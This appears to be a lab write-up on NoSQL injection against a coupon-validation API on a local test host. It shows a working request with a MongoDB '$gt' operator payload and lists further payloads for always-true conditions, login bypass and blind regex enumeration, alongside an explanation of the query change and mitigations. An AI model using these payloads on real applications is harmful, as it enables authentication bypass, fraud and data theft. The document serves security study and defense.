# NoSQL Injection

NoSQL Injection is a vulnerability that occurs when user input is not properly validated before being used in NoSQL database queries (such as MongoDB). Attackers can manipulate query logic using special operators to bypass authentication, extract data, or alter application behavior.

## Target Endpoints

- `http://192.168.1.28:8888/shop`
- `http://192.168.1.28:8888/community/api/v2/coupon/validate-coupon`

Reference payloads:
- `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/Intruder/NoSQL.txt`

## Example: Coupon Validation Bypass

### Request

```
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: 192.168.1.28:8888
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
    "coupon_code":{"$gt":""}
}
```
---


Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master

NoSQL Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/Intruder/NoSQL.txt

---


## Vulnerability Description

The `coupon_code` parameter is expected to be a string, but the application accepts a JSON object containing a MongoDB operator:

```json
{"$gt":""}
```

- This modifies the backend query logic. Instead of checking:

```javascript
db.coupons.findOne({ coupon_code: "USER_INPUT" })
```

- It becomes:

```javascript
db.coupons.findOne({ coupon_code: { $gt: "" } })
```

- Since most coupon codes are greater than an empty string, the query returns a valid coupon, bypassing validation.

## Impact

- Authentication or validation bypass
- Unauthorized access to discounts or features
- Data exposure from database queries
- Business logic abuse

---


## Additional Payload Examples

- Always True Condition:
  - `{"coupon_code":{"$ne":null}}`
- Regex Bypass:
  - `{"coupon_code":{"$regex":".*"}}`
- Authentication Bypass Example:
  - `{"username":{"$ne":null}, "password":{"$ne":null}}`
- Blind NoSQL Injection (char enumeration):
  - `{"coupon_code":{"$regex":"^A"}}`

## Detection Techniques

- Send JSON objects instead of expected strings
- Use operators such as:
  - `$ne`
  - `$gt`
  - `$lt`
  - `$regex`
- Observe:
  - Changes in response behavior
  - Successful bypass of validation
  - Unexpected data returned

## Mitigation Strategies

### Input Validation
- Enforce strict data types (e.g., string only)
- Reject objects and operators in user input

### Use Parameterized Queries
- Avoid directly embedding user input into queries
- Use safe query builders or ORM methods

### Sanitization
- Remove or block special MongoDB operators (`$`, `.`)

### Schema Enforcement
- Apply schema validation (e.g., MongoDB schema validation)

### Least Privilege
- Restrict database permissions to minimize impact

## Key Takeaway

NoSQL injection allows attackers to manipulate database queries by injecting operators into input fields.Proper validation, santization and secure query handling are essential to prevent this class of vulnerabilities.

---